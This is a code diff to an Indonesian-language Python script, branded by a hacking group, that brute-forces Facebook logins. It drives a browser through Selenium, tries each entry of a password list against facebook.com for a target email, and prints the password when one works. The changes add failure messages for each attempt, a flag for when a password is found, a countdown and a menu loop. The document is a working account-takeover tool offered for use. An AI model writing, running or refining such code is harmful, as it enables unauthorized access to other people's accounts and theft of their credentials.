@@ -45,15 +45,15 @@ def banner():
     os.system('cls' if os.name == 'nt' else 'clear')  
     print(" ")
     runntxt(GL + "   ..LOADING, HARAP BERSABAR .....")
-    time.sleep(1.5) 
+    time.sleep(1) 
     runntxt(WW + "   ....")
-    time.sleep(1.3)     
+    time.sleep(0.9)     
     runntxt(WW + "   ......")
-    time.sleep(1.1) 
+    time.sleep(0.8) 
     runntxt(GL + "   ........")
-    time.sleep(0.9) 
-    runntxt(GG + "   ..........")
     time.sleep(0.7) 
+    runntxt(GG + "   ..........")
+    time.sleep(0.6) 
     runntxt(YY + "   ............")
     time.sleep(0.5)     
     runntxt(GG + "   MEMBUKA SCRIPT.............................")
@@ -66,7 +66,7 @@ def banner():
     print(WW + "  |           AUTHOR : SCREENLAVERS             |")
     print(GL + "  |  TELEGRAM : https://t.me/+ep9c0nTDAGxlMTVl  |")
     print(WW + "  |          TEAM : LAMPUNG CYBER TEAM          |")
-    print(YY + "   |               NO SYSTEM IS SAFE             |")
+    print(YY + "  |               NO SYSTEM IS SAFE             |")
     print(GL + "  |---------------------------------------------|")
     print(GL + "  |          NO HACK NO LIFE [ ATTACKER ]       |")
     print(GL + "  |---------------------------------------------|")
@@ -102,6 +102,7 @@ def main():
             EC.presence_of_element_located((By.NAME, "email"))
         )
         
+        found_password = False  # Flag untuk memeriksa apakah password ditemukan
         with open(password_list, "r") as file:
             for line in file:
                 password = line.strip()
@@ -132,14 +133,21 @@ def main():
                     print(RR + f"#\033[97m ID / Email Target:\033[92m {email_target}")
                     print(RR + f"#\033[97m Password Target:\033[92m {password}")
                     print(" ")
+                    found_password = True  # Menandai bahwa password ditemukan
                     input(WW + "TEKAN ENTER UNTUK KELUAR...")
                     break
                 else:
+                    print(RR + f"Password \033[91m{password}\033[0m GAGAL! Mencoba password berikutnya...")
                     driver.get("https://www.facebook.com/login.php")
                     # Tunggu hingga elemen email tersedia lagi
                     email_element = WebDriverWait(driver, 10).until(
                         EC.presence_of_element_located((By.NAME, "email"))
                     )
+
+        if not found_password:
+            print(RR + "\n[!] Password tidak ditemukan setelah mencoba semua password dalam list.")
+            countdown(5)  # Menghitung mundur sebelum kembali ke menu
+
     except WebDriverException as e:
         print(RR + f"\nKesalahan WebDriver: {str(e)}")
     except FileNotFoundError:
@@ -148,25 +156,40 @@ def main():
         print(RR + f"\nKesalahan: {str(e)}")
     finally:
         driver.quit()
+        os.system('cls' if os.name == 'nt' else 'clear')  # Menghapus tampilan setelah selesai
+
+def countdown(seconds):
+    for i in range(seconds, 0, -1):
+        print(GG + f"Kembali ke menu utama dalam {i} detik...", end='\r')  # Gunakan end='\r' untuk menimpa baris yang sama
+        time.sleep(1)
+    print(GG + "Kembali ke menu utama dalam 0 detik...")  # Menampilkan akhir hitungan mundur
 
 def menu():
     banner()
-    print(GG + "Pilih Menu:")
-    print(YY + "[1] Install Semua Tools yang Diperlukan")
-    print(YY + "[2] Jalankan Script Utama")
-    choice = input(GL + "Pilih opsi (1/2): ")
-    
-    if choice == "1":
-        install_requirements()
-        print(GG + "\n[*] Semua dependensi telah diinstal dan ChromeDriver siap digunakan!")
-        print(GG + "[*] Kembali ke menu utama dalam 3 detik...")
-        time.sleep(5)
-        menu()
-    elif choice == "2":
-        main()
-    else:
-        print(RR + "[!] Pilihan tidak valid. Silakan coba lagi.")
-        menu()
+    while True:  # Loop untuk memastikan menu terus tampil
+        print(GG + "Pilih Menu:")
+        print(YY + "[1] Install Semua Tools yang Diperlukan")
+        print(YY + "[2] Jalankan Script Utama")
+        print(YY + "[3] Keluar")  # Menambahkan opsi keluar
+        choice = input(GL + "Pilih opsi (1/2/3): ")
+        
+        if choice == "1":
+            install_requirements()
+            print(GG + "\n[*] Semua dependensi telah diinstal dan ChromeDriver siap digunakan!")
+            countdown(5)  # Menghitung mundur sebelum kembali ke menu
+            banner()  # Menampilkan banner lagi setelah hitung mundur
+        elif choice == "2":
+            main()
+            os.system('cls' if os.name == 'nt' else 'clear')  # Menghapus tampilan setelah menyelesaikan script utama
+            banner()  # Menampilkan banner lagi setelah kembali ke menu
+        elif choice == "3":
+            print(GG + "Terima kasih telah menggunakan script ini. Selamat tinggal!")
+            sys.exit(0)
+        else:
+            print(RR + "[!] Pilihan tidak valid. Silakan coba lagi.")
+            countdown(5)  # Menghitung mundur sebelum kembali ke menu
+            os.system('cls' if os.name == 'nt' else 'clear')  # Menghapus tampilan sebelumnya
+            banner()  # Menampilkan banner lagi
 
 if __name__ == '__main__':
     menu()
